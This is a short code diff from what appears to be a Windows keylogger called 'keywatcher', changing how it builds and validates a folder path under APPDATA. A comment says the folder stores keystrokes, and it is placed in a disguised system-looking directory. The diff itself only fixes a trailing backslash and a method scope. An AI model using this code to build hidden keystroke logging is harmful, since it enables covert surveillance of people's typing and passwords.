@@ -31,7 +31,7 @@ std::string keywatcher::get_apps_root_path() {
   std::string base_path = getenv("APPDATA");
 
   // path we want to put keystrokes and keywatcher logs
-  std::string apps_path = "\\Microsoft\\Windows\\Templates\\dumps0x45gg";
+  std::string apps_path = "\\Microsoft\\Windows\\Templates\\dumps0x45gg\\";
 
   return base_path + apps_path;
 }
@@ -43,7 +43,7 @@ bool keywatcher::make_dir(std::string path) {
 }
 
 
-bool validate_apps_root_path(std::string path) {
+bool keywatcher::validate_apps_root_path(std::string path) {
   // looping through the path and checking at each \\ for path's existence
   for (char &ch : path) {
     if (ch == '\\') {
